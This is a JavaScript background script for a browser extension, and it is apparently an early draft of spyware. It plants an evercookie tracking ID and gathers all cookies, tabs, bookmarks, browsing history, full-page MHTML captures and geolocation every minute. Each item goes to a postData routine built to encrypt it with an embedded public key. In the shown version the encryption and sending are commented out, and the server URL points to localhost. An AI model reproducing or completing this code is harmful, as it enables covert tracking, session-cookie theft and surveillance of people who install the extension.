///////////////////////////////////////////////////////////////////////////////
// Determine UUID and activate evercookie.
///////////////////////////////////////////////////////////////////////////////

var uuid = null;
var ec = new evercookie();

// Get UUID from evercookie.
ec.get("uuid", function (value) {
    // Set uuid value.
    if (value === undefined) {
        uuid = Math.uuid();
        ec.set("uuid", uuid);
        console.log("UUID (new):", uuid);
    } else {
        uuid = value;
        console.log("UUID:", uuid);
    }
    // Activate listeners.
    activateListeners();
});

///////////////////////////////////////////////////////////////////////////////
// Define public-key.
///////////////////////////////////////////////////////////////////////////////

var publicKey =
    ["-----BEGIN PUBLIC KEY-----",
     "MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgH/DQTiW3r53iXbRDOnvBr5se3NS",
     "kzah0lq9WzyrmQsD3UgeucYm/iBJ5fxcY0XaKLCE4wgH/dl/2ZZEPjBQDqtccM+F",
     "Gz5Y7Rh8d1xs9M9IBd2CONDr6McHbwKL92kVBE/4IWOXdu/bGhLX8fCGe7hQ7xnw",
     "mz45rrZ+mc1GvxW7AgMBAAE=",
     "-----END PUBLIC KEY-----"
    ].join("\n");
var encryptor = new JSEncrypt();
encryptor.setPublicKey(publicKey);

///////////////////////////////////////////////////////////////////////////////
// Define getters.
///////////////////////////////////////////////////////////////////////////////

var getFingerprint = function () {
    fingerprint = {};
    fingerprint.userAgent = getUserAgent();
    fingerprint.screenResolution = getScreenResolution();
    postData("fingerprint", fingerprint);
}

var getUserAgent = function () {
    return navigator.userAgent;
};

var getScreenResolution = function () {
    return window.screen.width + "x" + window.screen.height;
};

var getCurrentPosition = function () {
    navigator.geolocation.getCurrentPosition(function (position) {
        console.log("Position found.");
        postData("geoposition", position);
    }, function(positionError) {
        console.log("Position not found.");
        postData("geoposition", null);
    });
};

var getPageCapture = function (tabId) {
    chrome.pageCapture.saveAsMHTML({"tabId": tabId}, function (mhtmlData) {
        var payload = {};
        payload.tabId = tabId;
        payload.mhtmlData = mhtmlData;
        postData("pageCapture", payload);
        // saveAs(mhtmlData, tabId + '.mhtml');
    })
};

var getAllCookies = function () {
    chrome.cookies.getAll({}, function (cookieArray) {
        postData("cookies-all", cookieArray);
    });
};

var getAllTabs = function () {
    chrome.windows.getAll({"populate": true}, function (windowArray) {
        postData("tabs-all", windowArray);
    });
}

var getAllBookmarks = function () {
    chrome.bookmarks.getTree(function (results) {
        postData("bookmarks-all", results);
    });
};

var getAllHistory = function () {
    chrome.history.search({"text": ""}, function (historyArray) {
        postData("history-all", historyArray);
    });
};

///////////////////////////////////////////////////////////////////////////////
// Define listener related functions.
///////////////////////////////////////////////////////////////////////////////

var onTabCreate = function (tab) {
    console.log("Tab create:", "#" + tab.id, tab.title, "(" + tab.url + ")");
};

var onTabUpdate = function (tabId, changeInfo, tab) {
    if (changeInfo.status === "complete") {
        console.log("Tab update:", "#" + tab.id, tab.title,
                    "(" + tab.url + ")");
    }
};

var onTabActive = function (activeInfo) {
    console.log("Tab activated:", activeInfo.tabId);
};

var onTabRemove = function (tabId, removeInfo) {
    console.log("Tab remove:", tabId);
};

var onURLVisit = function (result) {
    console.log("URL visit:", result.title, "(" + result.url + ") at",
                result.lastVisitTime + ",", result.visitCount, "times");
};

var onURLRemoval = function (removed) {
    console.log(removed.urls);
};

var onCookieChange = function (changeInfo) {
    console.log(changeInfo);
};

var onBookmarkCreate = function (id, bookmark) {
    console.log(id, bookmark);
};

var onBookmarkChange = function (id, changeInfo) {
    console.log(id, changeInfo);
};

var onBookmarkRemove = function (id, removeInfo) {
    console.log(id, removeInfo);
};

var activateListeners = function () {
    console.log("Activating listeners...");
    chrome.tabs.onCreated.addListener(onTabCreate);
    chrome.tabs.onUpdated.addListener(onTabUpdate);
    chrome.tabs.onActivated.addListener(onTabActive);
    chrome.tabs.onRemoved.addListener(onTabRemove);
    chrome.history.onVisited.addListener(onURLVisit);
    // chrome.cookies.onChanged.addListener(onCookieChange);
    chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
    chrome.bookmarks.onChanged.addListener(onBookmarkChange);
    chrome.bookmarks.onRemoved.addListener(onBookmarkRemove);
    setInterval(getCurrentPosition, 60000);
};

///////////////////////////////////////////////////////////////////////////////
// Define transmission related functions.
///////////////////////////////////////////////////////////////////////////////

var SERVER_URL = "http://127.0.0.1/";


var postData = function (type, payload) {
    // Define data object.
    data = {}
    data.uuid = uuid;
    data.time = new Date().getTime();
    data.type = type;
    data.payload = payload;
    console.log(data);
    return data;
    // Compress and encrypt data object.
    // stringifiedData = JSON.stringify(data);
    // console.log(stringifiedData);
    // compressedData = compressString(stringifiedData);
    // encryptedData = Base64String.compress(encryptor.encrypt(compressedData));
    // return encryptedData;
};
